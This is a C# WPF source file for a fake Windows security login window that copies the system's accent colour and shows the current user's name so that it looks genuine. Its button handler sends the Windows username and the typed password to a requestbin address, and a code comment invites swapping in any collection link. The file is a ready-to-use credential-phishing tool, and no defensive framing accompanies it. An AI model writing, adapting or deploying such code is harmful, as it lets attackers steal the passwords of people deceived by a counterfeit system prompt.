using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace SecurityLogin
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        
        string username = System.Security.Principal.WindowsIdentity.GetCurrent().Name;

        public MainWindow()
        {
            InitializeComponent();
            choices.MouseEnter += Label_MouseEnter;
            choices.MouseLeave += choices_MouseLeave;
            compname.Content = Environment.UserName;
            MouseDown += Window_MouseDown;
            compname2.Content = username;
            var accentColor = SystemParameters.WindowGlassBrush;
            side1.Background = accentColor;
            side2.Background = accentColor;
            side3.Background = accentColor;
            side4.Background = accentColor;
            textbox.BorderBrush = accentColor;
            textbox.SelectionBrush = accentColor;
            choices.Foreground = accentColor;
        }
        private void Window_MouseDown(object sender, MouseButtonEventArgs e)
        {
            if (e.ChangedButton == MouseButton.Left)
                DragMove();
        }
        private async void Button_Click(object sender, RoutedEventArgs e)
        {
            // Insert requestbin or any other link you want the information to be sent to here.
             HttpWebRequest req = (HttpWebRequest)WebRequest.Create("https://requestbin.com/?????????" + username + "\\" + textbox.Text);
              req.GetResponse();

            await Task.Delay(20);
            this.Close();
        }

        private void Label_MouseEnter(object sender, MouseEventArgs e)
        {
            choices.Foreground = Brushes.Gray;
        }

        private void choices_MouseLeave(object sender, MouseEventArgs e)
        {
            var accentColora = SystemParameters.WindowGlassBrush;
            choices.Foreground = accentColora;
        }

        private void Button_Click_1(object sender, RoutedEventArgs e)
        {
            this.Close();
        }

        private void textbox_MouseDown(object sender, MouseButtonEventArgs e)
        {
            textbox.Clear();
        }
    }
}
